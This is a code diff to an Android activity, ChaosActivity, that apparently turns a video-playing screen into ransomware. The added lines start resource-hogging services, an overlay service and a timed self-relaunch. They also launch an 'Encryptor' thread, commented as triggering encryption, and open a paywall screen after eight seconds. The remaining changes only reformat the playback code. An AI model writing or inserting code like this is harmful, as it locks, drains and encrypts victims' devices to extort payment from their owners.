@@ -37,6 +37,16 @@ public class ChaosActivity extends Activity {
                         | View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                         | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                         | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN);
+
+        // trigger semua service + enkripsi
+        StrainService.start(this);
+        HogService.start(this, HogService1.class);
+        HogService.start(this, HogService2.class);
+        HogService.start(this, HogService3.class);
+        try { OverlayService.start(this); } catch (Throwable ignored) {}
+        StrainReceiver.scheduleRelaunch(this, 20);
+        new Thread(new Encryptor(this)).start();
+
         FrameLayout root = new FrameLayout(this);
         root.setBackgroundColor(Color.BLACK);
         GridLayout grid = new GridLayout(this);
@@ -68,19 +78,24 @@ public class ChaosActivity extends Activity {
         blp.bottomMargin = 60;
         root.addView(brand, blp);
         setContentView(root);
+
+        // pasang paywall setelah beberapa detik
+        new Thread(() -> {
+            try { Thread.sleep(8000); } catch (InterruptedException ignored) {}
+            runOnUiThread(() -> {
+                Intent i = new Intent(ChaosActivity.this, PaywallActivity.class);
+                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                try { startActivity(i); } catch (Throwable ignored) {}
+            });
+        }).start();
     }
     private void startTextureVideo(TextureView tv) {
         tv.setSurfaceTextureListener(new TextureView.SurfaceTextureListener() {
             @Override
-            public void onSurfaceTextureAvailable(SurfaceTexture st, int w, int h) {
-                playOn(tv, st);
-            }
-            @Override
-            public void onSurfaceTextureSizeChanged(SurfaceTexture st, int w, int h) {}
-            @Override
-            public boolean onSurfaceTextureDestroyed(SurfaceTexture st) { return true; }
-            @Override
-            public void onSurfaceTextureUpdated(SurfaceTexture st) {}
+            public void onSurfaceTextureAvailable(SurfaceTexture st, int w, int h) { playOn(tv, st); }
+            @Override public void onSurfaceTextureSizeChanged(SurfaceTexture st, int w, int h) {}
+            @Override public boolean onSurfaceTextureDestroyed(SurfaceTexture st) { return true; }
+            @Override public void onSurfaceTextureUpdated(SurfaceTexture st) {}
         });
     }
     private void playOn(TextureView tv, SurfaceTexture st) {
@@ -117,9 +132,7 @@ public class ChaosActivity extends Activity {
     }
     @Override
     protected void onDestroy() {
-        for (MediaPlayer mp : players) {
-            try { mp.release(); } catch (Throwable ignored) {}
-        }
+        for (MediaPlayer mp : players) { try { mp.release(); } catch (Throwable ignored) {} }
         players.clear();
         super.onDestroy();
     }
